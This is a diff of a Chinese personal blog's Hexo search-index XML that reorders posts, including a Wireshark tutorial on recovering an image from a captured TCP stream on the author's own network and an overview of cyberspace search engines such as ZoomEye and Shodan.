+              <div class="tag link"><a class="link-card" title="菜鸟渗透日记24---DC-4靶机打靶过程详解" href="https://blog.csdn.net/leesir98/article/details/101620077"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">菜鸟渗透日记24---DC-4靶机打靶过程详解</p><p class="url">https://blog.csdn.net/leesir98/article/details/101620077</p></div></a></div><div class="tag link"><a class="link-card" title="DC-4靶机渗透指南（渗透测试详细操作）" href="https://blog.csdn.net/weixin_45671944/article/details/121747512"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">DC-4靶机渗透指南（渗透测试详细操作）</p><p class="url">https://blog.csdn.net/weixin_45671944/article/details/121747512</p></div></a></div><div class="tag link"><a class="link-card" title="【vulnhub】---DC-4靶机" href="https://blog.csdn.net/qq_43168364/article/details/106626917"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【vulnhub】---DC-4靶机</p><p class="url">https://blog.csdn.net/qq_43168364/article/details/106626917</p></div></a></div>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《拒绝校园贷》——大学生心理微电影</title>
+    <url>/2022/05/01/weidianying/</url>
+    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
+</div>
+<div align="center" class="aspect-ratio">
+    <iframe src="https://player.bilibili.com/player.html?aid=853713641&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
+    </iframe>
+</div>
+]]></content>
+      <categories>
+        <category>视频</category>
+      </categories>
+      <tags>
+        <tag>bilibili</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP协议传输数据还原测试</title>
+    <url>/2022/10/04/tcptest/</url>
+    <content><![CDATA[<details class="folding-tag" yellow=""><summary> 相关原理： </summary>
+              <div class="content">
+              <p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。我们来看看这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。</p><p>QQ的文件发送是怎样的过程呢？通常，发送文件的计算机首先要通过消息服务器将其IP地址发送给接收计算机，当接收计算机同意接收的确认消息反馈到消息服务器后，消息服务器将据此设置好文件传输对话。随即，发送计算机与接收计算机就会在确定好的端口范围内，建立起TCP或UDP连接开始文件的检索与传输。</p><p>在默认状态下，QQ优先采用了UDP（User Data Protocol，用户数据报协议）协议传送数据，而对可靠性要求高的数据通讯系统往往使用TCP协议传输数据。与TCP协议不同，UDP协议并不提供数据传送的验证机制——在整个文件传输过程中如果出现数据报的丢失，协议本身并不能作出任何的检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。 UDP协议适用于无须应答、要求时效的软件使用，这样的设计正好与QQ追求的目标相符，所以QQ优先使用了此协议进行一切功能应用。但是，由于UDP协议具有不可靠性，常会因种种原因导致消息或数据的发送失败（很多时候会发现发送文件给对方接收时，对方根本收不到要求接收文件的消息。或是发送聊天消息时，对方根本没有收到过消息）。显然，UDP协议由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。QQ在数据传输上更注重实际性能，为了获得更好的使用效果，往往可以牺牲一定的可靠性。因此，使用QQ来传输数据，在很多时候就成了一个“不错”的选择。（来自互联网）</p>
+              </div>
+            </details>
+<h1>测试环境：</h1>
+<p>将手机与电脑连接至同一局域网中。</p>
+<ul>
+<li>
+<p>手机IP:<code>192.168.31.216</code></p>
+<p><img src="https://img.anineg.space/3454545.png" alt="Screenshot_20221004_140105"></p>
+</li>
+<li>
+<p>电脑IP:<code>192.168.31.182</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004140012.png" alt="QQ截图20221004140012"></p>
+</li>
+</ul>
+<h1>Wireshark抓包</h1>
+<p>启动WireShark，选择WLAN过滤器：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004132831.png" alt="QQ截图20221004132831"></p>
+<p>在过滤器中输入：<code>ip.src == 192.168.31.216</code>以捕获/过滤指定ip地址（手机）数据包。</p>
+<p><img src="https://img.anineg.space/12345664556.png" alt="12345664556"></p>
+<p>此时，我们在手机上发送一张图片给电脑，我们可以看到Wireshark捕获了大量数据包。其中这一项就是我们刚刚发送的图片：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135150.png" alt="QQ截图20221004135150"></p>
+<p>右键，选择“追踪流=&gt;TCP流”</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135442.png" alt="QQ截图20221004135442"></p>
+<p>数据格式选择“原始数据”，然后将其另存为新文件。</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135514.png" alt="QQ截图20221004135514"></p>
+<h1>数据还原</h1>
+<p>使用16进制编辑器（如WinHex）打开文件，找到jpg格式图片的文件头<code>FF D8 FF</code>,并把文件头前面的数据删除：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135748.png" alt="QQ截图20221004135748"></p>
+<p>保存后，将文件后缀改为<code>.jpg</code>，至此，文件得以还原：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135901.png" alt="QQ截图20221004135901"></p>
+<div class="tag link"><a class="link-card" title="文件头标识及对应类型表" href="https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表："><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">文件头标识及对应类型表</p><p class="url">https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表：</p></div></a></div>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>Wireshark</tag>
+      </tags>
   </entry>
   <entry>
     <title>使用Vercel+Github搭建个人博客</title>
@@ -1357,58 +1452,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>个人博客入坑实录</title>
-    <url>/2022/01/12/start/</url>
-    <content><![CDATA[<h3 id="🏃‍♂️这是一个强迫症建设网站的辛酸历程"><s>🏃‍♂️这是一个强迫症建设网站的辛酸历程</s></h3>
-<h3 id="👨‍🦽这是一段令人心酸的网站建设历程">👨‍🦽这是一段令人心酸的网站建设历程</h3>
-<hr>
-<h1>✏第一天：2022.1.11</h1>
-<p>放假在家n天，闲来无事，恰巧<a href="https://cgrona.top/">风清竹喧</a>同学在建个人博客，便决心一起入坑。经过几十分钟的研究，解决了域名注册以及GitHub仓库的建设。当天晚上，临时使用了GitHub自带的主题模板：</p>
-<p><img src="https://s2.loli.net/2022/01/17/QkuBvtf36zNTUY8.png" alt="202201161728985" title="初始界面"></p>
-<p>没错…</p>
-<p>它很丑，而且自由度可玩性很低，至少不是我能接受的结果。</p>
-<p>参考文章：<a href="https://sspai.com/post/54608">GitHub Pages 搭建教程</a></p>
-<hr>
-<h1>✏第二天：2022.1.12</h1>
-<p>在经过了解相关知识后，最终决定采用Hexo + GitHub 的方式来搭建免费个人博客网站。</p>
-<p>不做详细介绍，简单叙述下：</p>
-<h3 id="GitHub-Pages-是什么？"><strong>GitHub Pages 是什么？</strong></h3>
-<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
-<h3 id="Hexo-是什么？"><strong>Hexo 是什么？</strong></h3>
-<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
-<h3 id="Hexo-GitHub-文章发布原理"><strong>Hexo + GitHub 文章发布原理</strong></h3>
-<p>在本地撰写 Markdown 格式文章后，通过 Hexo 解析文档，渲染生成具有主题样式的 HTML 静态网页，再推送到 GitHub 上完成博文的发布。</p>
-<h3 id="优点和不足"><strong>优点和不足</strong></h3>
-<p>优点：完全免费；静态站点，轻量快速；可按需求自由定制改造；托管在 GitHub，安全省心；迁移方便……</p>
-<p>不足：发文不便，依赖于本地环境；更适合个人博客使用；GitHub 在国内访问速度有点不快。（但实际上速度还是可以接受的，除了图片，真的很慢，建议将图片放图床，后面会讲到）</p>
-<p>一切都搞定后，它大概是长这个样子的⬇⬇⬇</p>
-<p><img src="https://s2.loli.net/2022/01/17/DjrMYknOSEcyzQu.jpg" alt="202201161921239"></p>
-<p>比昨天的好看多了！但是还是没有让人那么满意…</p>
-<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></p>
-<hr>
-<h1>✏第三，四天：2022.1.13-14</h1>
-<p>后来经了解，发现了原来hexo是有很多主题可以用的，在这个时候我选择了Next主题来升级我的页面。</p>
-<p>整个过程不算难，跟着教程来一步步地很快就完成了。但最大的问题出在了后期的美化上。我使用的Next是8.9.0的版本，而网上大多数教程都是7.x甚至6.x的版本。据说在7.5后Next的文件结构是做了一些改动的，有人称它为“移除了custom文件的神奇跨时代版本”，这一点我在实际操作的时候真的是感同身受…</p>
-<p>但困难总比办法多嘛，在我的不懈努力之下，我发现了一位大佬的博客，其中里面详细叙述了各种文件改动以及解决方法，最终花了大概两天的时间，我的博客终于变成了我想要的样子：</p>
-<p><img src="https://s2.loli.net/2022/01/17/n7Z1Q2cCpVgai9w.jpg" alt="202201161953425"></p>
-<p>除了应用网上的各种教程以外，还可以去好好研究研究主题配置文件，使用 hexo s 命令一边改一边看效果，往往会有意想不到的效果。因为主题的版本越高，它往往内置的插件越多，所以很多东西并不需要去 npm install 的。</p>
-<p>参考文章：</p>
-<p>​	<a href="http://theme-next.iissnan.com/getting-started.html">安装 NexT</a></p>
-<p>​	<a href="https://blog.csdn.net/Growing_potato/article/details/113926856">next主题美化</a></p>
-<p>​	<a href="https://blog.csdn.net/C_acgl/article/details/86555826">Hexo优化</a></p>
-<p>​	<a href="https://www.jianshu.com/p/f054333ac9e6">打造炫酷网站</a></p>
-<p>​	<a href="https://zhuanlan.zhihu.com/p/251383216">next8.0主题美化</a></p>
-<p>​	<a href="https://tding.top/archives/2bd6d82.html">大佬的文章</a></p>
-<p>​	<a href="https://hexo-next.readthedocs.io/zh_CN/latest/">Hexo-NexT说明书</a></p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《我不是药神》</title>
     <url>/2022/03/17/wobushiyaoshen/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
@@ -1426,23 +1469,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <categories>
         <category>随手记</category>
       </categories>
-  </entry>
-  <entry>
-    <title>《拒绝校园贷》——大学生心理微电影</title>
-    <url>/2022/05/01/weidianying/</url>
-    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
-</div>
-<div align="center" class="aspect-ratio">
-    <iframe src="https://player.bilibili.com/player.html?aid=853713641&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
-    </iframe>
-</div>
-]]></content>
-      <categories>
-        <category>视频</category>
-      </categories>
-      <tags>
-        <tag>bilibili</tag>
-      </tags>
   </entry>
   <entry>
     <title>CTF隐写术(图片隐写)</title>
@@ -1658,35 +1684,6 @@ PNG图片文件结构：</p>
       </tags>
   </entry>
   <entry>
-    <title>ZoomEye-网络空间搜索引擎</title>
-    <url>/2022/10/09/zoomeye/</url>
-    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
-<p class="p center small">一个针对网络空间的搜索引擎</p>
-<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
-<h1>ZoomEye</h1>
-<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
-<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
-<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
-<h1>其他网络空间搜索引擎</h1>
-<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
-<h2 id="Shodan">Shodan</h2>
-<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
-<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
-<h2 id="Censys">Censys</h2>
-<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
-<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
-<h2 id="FOFA">FOFA</h2>
-<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
-<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>搭建几乎0成本的个人网盘</title>
     <url>/2022/11/20/yunpan/</url>
     <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
@@ -1720,6 +1717,35 @@ PNG图片文件结构：</p>
       <tags>
         <tag>Vercel</tag>
         <tag>网盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ZoomEye-网络空间搜索引擎</title>
+    <url>/2022/10/09/zoomeye/</url>
+    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
+<p class="p center small">一个针对网络空间的搜索引擎</p>
+<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
+<h1>ZoomEye</h1>
+<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
+<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
+<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
+<h1>其他网络空间搜索引擎</h1>
+<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
+<h2 id="Shodan">Shodan</h2>
+<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
+<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
+<h2 id="Censys">Censys</h2>
+<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
+<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
+<h2 id="FOFA">FOFA</h2>
+<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
+<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
